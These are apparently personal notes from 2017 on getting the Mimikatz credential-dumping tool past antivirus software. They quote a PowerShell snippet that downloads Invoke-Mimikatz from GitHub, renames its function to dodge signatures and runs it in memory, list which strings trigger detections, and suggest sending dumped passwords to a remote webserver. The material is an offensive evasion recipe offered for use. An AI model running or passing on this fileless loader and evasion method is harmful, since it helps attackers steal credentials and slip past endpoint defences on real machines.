>>> [REFERENCE] SOURCE CODE:
    [+] https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1    

>>> [REFERENCE] BYPASS ANTI-VIRUS:
    *The content in linked article is not as effective anymore (still triggers tons of alerts), and the Tony G way to directly load source code to memory will trigger alerts and fail, as tested on Win10 (10.0.15063), but their theories still work wonders (as of 20170805).
    Summarize the theories below: Customize the source code (time consuming but effective), test in VirusTotal, then load to memory from local or network source.

    https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/

    [+] Run code from memory instead of physical file on target:
        Tony G	
        JULY 25, 2017	@ 2:11 PM

        Why use IEX? The script below goes straight into memory without calling Internet Explorer (which may be way Defender is catching  it). This gets past McAfee without incident:

        $uri = ‘https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1’

        # Get the script code:
        $functionCode = Invoke-RestMethod -Method Get -Uri $uri

        # El perro, el perro, es mi corazón, El gato, el gato, el gato no es bueno.
        $mimidogzCode = $functionCode -replace “Invoke-Mimikatz”, “Invoke-Mimidogz”

        # Instantiate a ScriptBlock passing the
        # source code to the constructor:
        $mimidogz = [ScriptBlock]::Create($mimidogzCode)

        # Load it into memory:
        . $mimidogz

        # Done!
        Invoke-Mimidogz

>>> KNOWN ALERTS (as of 20170806):
    [+] dll contents (ONE, "ikarus", rest of the a/v either doesn't scan or doesn't scan this deep)
    [+] "$PEBytes" (THREE)
    [+] function get-win32types: "NoteProperty" (NINE)

>>> LESSONS LEARNED FROM FIRST VIRUS STUDY (as of 20170806):
    [+] Even known virus can't be identified by anti-virus software - I knew the fact but now I know why.
    [+] Github hosts all kind of files! :)
    [+] Powershell can do more than boring work things! :)
    [+] Most anti-virus software companies are lazy, and most of them don't use smart scan filters
    [+] Virus doesn't need to be on the computer to run (thanks Tony G)
    [+] With a webserver, pwd dump can be dumped to remote webserver after code execution (ref: https://www.youtube.com/watch?v=4kX90HzA0FM&t=1509s). Combining Tony G's method, to load code into memory instead of downloading, should be safer in theory.
    [+] Editing virus source code time consuming but fun, and a great way to learn how anti-virus software work.
